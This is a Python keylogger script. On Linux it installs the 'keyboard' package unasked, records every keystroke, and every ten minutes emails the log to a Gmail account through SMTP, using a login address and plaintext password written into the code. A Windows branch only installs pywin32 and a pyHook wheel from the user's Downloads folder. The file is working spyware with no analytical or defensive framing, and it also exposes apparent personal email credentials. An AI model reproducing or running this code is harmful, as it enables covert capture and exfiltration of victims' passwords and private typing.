import subprocess
import sys
import os
import smtplib

reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
    
SEND_REPORT_EVERY = 600 # 10 minutes
EMAIL_ADDRESS = "khode.ali2000@gmail.com"
EMAIL_PASSWORD = "ali2000ali2000"

if sys.platform == 'linux':
    
    if 'keyboard' not in installed_packages:
        os.system('pip3 install keyboard')
    import keyboard # for keylogs
    # Semaphore is for blocking the current thread
    # Timer is to make a method runs after an `interval` amount of time
    from threading import Semaphore, Timer


    class Keylogger:
        def __init__(self, interval):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            # this is the string variable that contains the log of all
            # the keystrokes within `self.interval`
            self.log = ""
            # for blocking after setting the on_release listener
            self.semaphore = Semaphore(0)

        def callback(self, event):
            """This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)"""
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            self.log += name

        def sendmail(self, email, password, message):
            # manages a connection to the SMTP server
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            # connect to the SMTP server as TLS mode ( for security )
            server.starttls()
            # login to the email account
            server.login(email, password)
            # send the actual message
            server.sendmail(email, email, message)
            # for sending binery codes:
            # message = ''.join(format(ord(i), 'b') for i in message) 
            # send from khode.ali2000@gmail.com to chalghoos1@gmail.com
            # terminates the session
            server.quit()

        def report(self):
            """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
            """
            if self.log:
                # if there is something in log, report it
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                # print(self.log)
            self.log = ""
            Timer(interval=self.interval, function=self.report).start()


        def start(self):
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # block the current thread,
            # since on_release() doesn't block the current thread
            # if we don't block it, when we execute the program, nothing will happen
            # that is because on_release() will start the listener in a separate thread
            self.semaphore.acquire()


    if __name__ == "__main__":
        keylogger = Keylogger(interval=SEND_REPORT_EVERY)
        keylogger.start()
elif sys.platform == 'win32':
    import getpass
    username = getpass.getuser()
    list_of_dependencies = ['pywin32', 'C:/Users/%s/Downloads/pyHook-1.5.1-cp37-cp37m-win_amd64.whl' % username]
    for library in list_of_dependencies:
        if library not in installed_packages:
            os.system('pip3 install %s' % library)

